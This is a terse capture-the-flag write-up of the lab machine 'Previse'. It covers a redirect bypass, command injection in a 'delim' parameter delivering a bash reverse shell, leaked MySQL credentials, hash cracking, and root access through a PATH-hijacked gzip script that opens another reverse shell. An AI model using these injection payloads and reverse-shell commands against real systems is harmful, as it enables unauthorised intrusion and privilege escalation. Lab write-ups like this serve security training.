----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Previse
# 29/3/2023
10.10.11.104

----------------------------------------------------
# nmap
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

----------------------------------------------------
# gobuster
----------------------------------------------------
/.php                 (Status: 403) [Size: 277]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/login.php            (Status: 200) [Size: 2224]
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]
/nav.php              (Status: 200) [Size: 1248]
/footer.php           (Status: 200) [Size: 217]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2966] [--> login.php]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/logs.php             (Status: 302) [Size: 0] [--> login.php]

----------------------------------------------------
# initial
----------------------------------------------------
http://10.10.11.104/nav.php
When clicking on create account we are redirected back to the login page. Testing for faulty redirects I
captured the request in BurpSuite and sent the GET request to the repeater tab. After processing a GET
request we see that we have access to the accounts.php if we choose not to follow redirects.

http://10.10.11.104/accounts.php
intercept response of request and change to 200 Ok
we get acc creation page
 create ann ac




 POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/accounts.php
Cookie: PHPSESSID=4ul04h8jjpi356iauktvertqsg
Upgrade-Insecure-Requests: 1

username=testuser&password=password123&confirm=password123&submit=



user created succes


login



intercept http://10.10.11.104/file_logs.php  and sumbit

test this
delim=comma;ping -c 1 10.10.14.6 

delim=comma;bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1' 
url endcode and sennd we got a shell


----------------------------------------------------
# lateral movemennt
----------------------------------------------------
cat config.php
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';

 mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)'


 |  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |

 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 └─$ hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt


oxdf@parrot$ sshpass -p 'ilovecody112235!' ssh m4lwhere@10.10.11.104


----------------------------------------------------
# priv esc
----------------------------------------------------
m4lwhere@previse:~$ sudo -l

m4lwhere@previse:/tmp$ 

#!/bin/bash

bash -i >& /dev/tcp/10.10.16.7/8001 0>&1

m4lwhere@previse:/tmp$ chmod +x gzip 
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh

└─$ nc -lvnp 8001

root@previse:/tmp# cat /root/root.txt
GG